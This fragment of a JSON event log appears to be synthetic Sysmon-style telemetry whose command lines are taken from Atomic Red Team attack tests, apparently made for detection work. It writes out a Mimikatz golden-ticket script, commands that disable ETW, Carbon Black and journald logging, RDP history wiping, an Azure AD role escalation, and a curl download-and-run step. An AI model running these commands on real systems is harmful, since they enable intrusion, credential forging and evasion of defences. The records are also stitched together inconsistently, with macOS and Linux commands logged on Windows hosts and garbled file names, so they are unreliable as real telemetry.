        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-63.barry.info",
        "User": "yfrench",
        "ProcessID": 7495,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg delete \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Terminal Server Client\\\\Default\\\" /va /f\\nreg delete \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Terminal Server Client\\\\Servers\\\" /f\\n\",",
        "LogonID": 202717,
        "LogonGuid": "882cc969-f318-4aa4-94b4-77e12a577316",
        "SourceProcessID": 7709,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\purpose..dll",
        "DestinationProcessID": 2058,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\television..exe",
        "UtcTime": "2024-05-17T01:36:51.776439Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-39.chan.biz",
        "User": "ecummings",
        "ProcessID": 9390,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Import-Module -Name AzureAD\\n$PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\nConnect-AzureAD -Credential $Credential\\n\\n$sp = Get-AzureADServicePrincipal -Filter \\\"DisplayName eq '#{service_principal_name}'\\\"\\nif ($sp -eq $null) { Write-Warning \\\"Service Principal not found\\\"; exit }\\n$role = Get-AzureADDirectoryRole -Filter \\\"DisplayName eq '#{role_name}'\\\"\\nif ($role -eq $null) { Write-Warning \\\"Role not found\\\"; exit }\\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId\\nWrite-Host \\\"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\\\"\\n\",",
        "LogonID": 431583,
        "LogonGuid": "7fd4667c-5262-422d-8ee7-2734556b6836",
        "SourceProcessID": 8890,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\move..exe",
        "DestinationProcessID": 3065,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\act..dll",
        "UtcTime": "2024-05-17T01:36:51.777437Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-76.taylor-martinez.com",
        "User": "christinemiller",
        "ProcessID": 6776,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"kubectl create -f src/cronjob.yaml -n #{namespace}\\n\",",
        "LogonID": 930492,
        "LogonGuid": "9dc20164-a36a-4663-a448-acd8c57d2afa",
        "SourceProcessID": 9297,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\career..dll",
        "DestinationProcessID": 6507,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\agency..exe",
        "UtcTime": "2024-05-17T01:36:51.777437Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-48.stokes-nixon.org",
        "User": "martinjoshua",
        "ProcessID": 3691,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"New-ItemProperty -Path HKLM:\\\\Software\\\\Microsoft\\\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \\\"DWord\\\" -Force\",",
        "LogonID": 975073,
        "LogonGuid": "56d07e96-e5fb-42e1-aad6-2bfd0a7c2c4d",
        "SourceProcessID": 1588,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\community..exe",
        "DestinationProcessID": 1745,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\able..dll",
        "UtcTime": "2024-05-17T01:36:51.777437Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-77.valenzuela.info",
        "User": "jcarter",
        "ProcessID": 4835,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v NoSetTaskbar /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 450426,
        "LogonGuid": "1cef8897-a386-45e7-aed7-43d71b3297a1",
        "SourceProcessID": 5355,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\player..dll",
        "DestinationProcessID": 2702,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\finally..exe",
        "UtcTime": "2024-05-17T01:36:51.777437Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-61.williams-mcneil.com",
        "User": "freemanchristopher",
        "ProcessID": 4723,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKCU\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\OOBE\\\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 378253,
        "LogonGuid": "2aaf1974-264a-4604-83e4-60e64e45642e",
        "SourceProcessID": 5614,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\example..exe",
        "DestinationProcessID": 2940,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\foreign..dll",
        "UtcTime": "2024-05-17T01:36:51.777437Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-40.davis.com",
        "User": "charleswilliamson",
        "ProcessID": 5833,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Remove-Item $env:TEMP\\\\golden.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\golden.txt -ErrorAction Ignore\\n\\n# get current domain SID if default was used\\n$domain_sid = \\\"#{domain_sid}\\\"\\nIf ($domain_sid -Match \\\"DEFAULT\\\") {\\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\\n}\\n\\n# create batch file with commands to run in a separate \\\"runas /netonly\\\" session\\n# so we don't purge Kerberos ticket from the current Windows session\\n# its output goes to golden.txt temp file, because we cannot capture \\\"runas /netonly\\\" output otherwise\\n@\\\"\\n>%TEMP%\\\\golden.txt 2>&1 (\\n  echo Purge existing tickets and create golden ticket:\\n  klist purge\\n  #{mimikatz_path} \\\"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt\\\" \\\"exit\\\"\\n\\n  echo.\\n  echo Requesting SYSVOL:\\n  dir \\\\\\\\#{domain}\\\\SYSVOL\\n  \\n  echo.\\n  echo Tickets after requesting SYSVOL:\\n  klist\\n\\n  echo.\\n  echo End of Golden Ticket attack\\n)\\n\\\"@ -Replace \\\"DOMAIN_SID\\\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\\\golden.bat\\n\\n# run batch file in a new empty session (password and username do not matter)\\necho \\\"foo\\\" | runas /netonly /user:fake \\\"$env:TEMP\\\\golden.bat\\\" | Out-Null\\n\\n# wait until the output file has logged the entire attack\\ndo {\\n  Start-Sleep 1 # wait a bit so the output file has time to be created\\n  Get-Content -Path \\\"$env:TEMP\\\\golden.txt\\\" -Wait | ForEach-Object {\\n    if ($_ -match 'End of Golden Ticket attack') { break } \\n  }\\n} while ($false) # dummy loop so that 'break' can be used\\n\\n# show output from new empty session\\nGet-Content $env:TEMP\\\\golden.txt\\n\\n# cleanup temp files\\nRemove-Item $env:TEMP\\\\golden.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\golden.txt -ErrorAction Ignore\\n\",",
        "LogonID": 207637,
        "LogonGuid": "e118855d-5ed7-429e-a00c-ebdff294ecca",
        "SourceProcessID": 4231,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\though..dll",
        "DestinationProcessID": 3818,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\country..dll",
        "UtcTime": "2024-05-17T01:36:51.778437Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-50.james.net",
        "User": "barbara06",
        "ProcessID": 2295,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"openssl genrsa -out #{key_filename} 4096\\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj \\\"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\\\" -out #{cert_filename}\\ncp #{cert_filename} /etc/pki/ca-trust/source/anchors/\\nupdate-ca-trust\\n\",",
        "LogonID": 140411,
        "LogonGuid": "81ca39be-6b8e-48ff-a1e3-a96860416de1",
        "SourceProcessID": 3290,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\thousand..exe",
        "DestinationProcessID": 5393,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\show..exe",
        "UtcTime": "2024-05-17T01:36:51.778437Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-02.martinez.com",
        "User": "johnsonalicia",
        "ProcessID": 1305,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 819810,
        "LogonGuid": "f3dd0e84-8c4a-461c-b114-d5d1808f7fa1",
        "SourceProcessID": 7040,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\recently..dll",
        "DestinationProcessID": 2691,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\benefit..exe",
        "UtcTime": "2024-05-17T01:36:51.778437Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-62.white.com",
        "User": "gabrielpowell",
        "ProcessID": 9578,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"icacls \\\"#{path}\\\" /grant Everyone:F /T /C /Q\",",
        "LogonID": 151554,
        "LogonGuid": "024888b7-8730-4443-8472-be2c982632c6",
        "SourceProcessID": 1324,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\exactly..dll",
        "DestinationProcessID": 3897,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\institution..dll",
        "UtcTime": "2024-05-17T01:36:51.778437Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-62.poole-flowers.info",
        "User": "carrjohn",
        "ProcessID": 2275,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"dscl . -create /Users/#{username}\\ndscl . -create /Users/#{username} UserShell /bin/zsh\\ndscl . -create /Users/#{username} RealName \\\"#{realname}\\\"\\ndscl . -create /Users/#{username} UniqueID \\\"1010\\\"\\ndscl . -create /Users/#{username} PrimaryGroupID 80\\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\\n\",",
        "LogonID": 966830,
        "LogonGuid": "c26b4acf-2cb1-4b92-87dc-617a0493c9e4",
        "SourceProcessID": 3801,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\example..exe",
        "DestinationProcessID": 8950,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\actually..dll",
        "UtcTime": "2024-05-17T01:36:51.778437Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-56.garza.net",
        "User": "daniellekim",
        "ProcessID": 3728,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\\n\",",
        "LogonID": 682853,
        "LogonGuid": "a3355225-d1b7-45b3-b9f6-ac8f0a5eca51",
        "SourceProcessID": 9990,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\attack..dll",
        "DestinationProcessID": 2114,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\position..dll",
        "UtcTime": "2024-05-17T01:36:51.779437Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-73.morgan.info",
        "User": "melissamiller",
        "ProcessID": 7974,
        "ProcessName": "nc.exe",
        "CommandLine": "\"powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\\\T1654_events.txt}\",",
        "LogonID": 331813,
        "LogonGuid": "5f64c2cf-fa63-4dfc-aca8-b5c7ac571413",
        "SourceProcessID": 1054,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\might..dll",
        "DestinationProcessID": 4511,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\lose..dll",
        "UtcTime": "2024-05-17T01:36:51.779437Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-07.smith-lopez.com",
        "User": "kathleenchristensen",
        "ProcessID": 2136,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"screencapture -x #{output_file}\\n\",",
        "LogonID": 127001,
        "LogonGuid": "12e3adfd-7f1b-47da-8308-61ec0aba1ca3",
        "SourceProcessID": 8130,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\worker..exe",
        "DestinationProcessID": 3522,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\bag..exe",
        "UtcTime": "2024-05-17T01:36:51.779437Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-80.roberts.com",
        "User": "marshmichael",
        "ProcessID": 5539,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf\\n\",",
        "LogonID": 424596,
        "LogonGuid": "b0f942b1-05c5-42f2-80c7-d44417b5572e",
        "SourceProcessID": 9888,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\author..dll",
        "DestinationProcessID": 6878,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\leave..exe",
        "UtcTime": "2024-05-17T01:36:51.779437Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-25.garcia.com",
        "User": "freemanteresa",
        "ProcessID": 1580,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\\n\",",
        "LogonID": 432247,
        "LogonGuid": "a40da858-4157-4d49-becc-f8dc7b43ed93",
        "SourceProcessID": 1180,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\area..dll",
        "DestinationProcessID": 5311,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\election..dll",
        "UtcTime": "2024-05-17T01:36:51.779437Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-58.gordon-howell.biz",
        "User": "michelle27",
        "ProcessID": 4792,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\\n\",",
        "LogonID": 339483,
        "LogonGuid": "3555a336-2065-4fe9-9f96-4d9ce73de698",
        "SourceProcessID": 7317,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\growth..exe",
        "DestinationProcessID": 8395,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\name..exe",
        "UtcTime": "2024-05-17T01:36:51.780437Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-20.smith.info",
        "User": "ssantiago",
        "ProcessID": 5513,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"dsenableroot #current user\\ndsenableroot -u art-tester -p art-tester -r art-root #new user\",",
        "LogonID": 672656,
        "LogonGuid": "a8524e2d-3770-4a3f-84e7-76682f085b2b",
        "SourceProcessID": 4741,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\realize..exe",
        "DestinationProcessID": 9852,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\authority..exe",
        "UtcTime": "2024-05-17T01:36:51.780437Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-02.guerrero-cole.biz",
        "User": "xrice",
        "ProcessID": 7297,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"netsh advfirewall firewall add rule name=\\\"atomic testing\\\" action=allow dir=in protocol=TCP localport=450 \\n\",",
        "LogonID": 938283,
        "LogonGuid": "35e61bb8-7970-4d13-bd19-29954b5dbee0",
        "SourceProcessID": 3784,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\board..exe",
        "DestinationProcessID": 2074,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\move..dll",
        "UtcTime": "2024-05-17T01:36:51.780437Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-04.roy-english.com",
        "User": "boylechristopher",
        "ProcessID": 5616,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"cd $HOME\\ncurl -O #{remote_url}/art\\ncurl -O #{remote_url}/gta.db\\ncurl -O #{remote_url}/sqlite_dump.sh\\nchmod +x sqlite_dump.sh\\nfind . ! -executable -exec bash -c 'if [[ \\\"$(head -c 15 {} | strings)\\\" == \\\"SQLite format 3\\\" ]]; then echo \\\"{}\\\"; ./sqlite_dump.sh {}; fi' \\\\;\\n\",",
        "LogonID": 684958,
        "LogonGuid": "0acb0c7f-2cd1-480c-96a0-632f4a7ef84d",
        "SourceProcessID": 4310,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\beat..exe",
        "DestinationProcessID": 2586,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\listen..dll",
        "UtcTime": "2024-05-17T01:36:51.780437Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-90.hernandez.com",
        "User": "brandy60",
        "ProcessID": 5844,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"wmic #{wmic_command} /FORMAT:\\\"#{local_xsl_file}\\\"\\n\",",
        "LogonID": 524585,
        "LogonGuid": "e5bb06be-20bd-4926-90e5-a3faf92bfd9b",
        "SourceProcessID": 1473,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\south..dll",
        "DestinationProcessID": 3350,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\song..dll",
        "UtcTime": "2024-05-17T01:36:51.780437Z"
    },
